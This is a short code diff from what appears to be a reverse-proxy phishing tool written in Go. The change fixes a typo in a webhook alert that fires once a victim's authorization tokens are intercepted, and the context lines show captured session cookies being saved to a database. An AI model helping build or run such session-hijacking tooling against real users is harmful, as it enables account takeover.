@@ -1061,7 +1061,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 						if p.cfg.kbWebhookUrl != "" {
-							notify := "Authorizatoin tokens intercpeted!"
+							notify := "Authorization tokens intercpeted!"
 							p.WebhookNotify(notify)
 						}
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
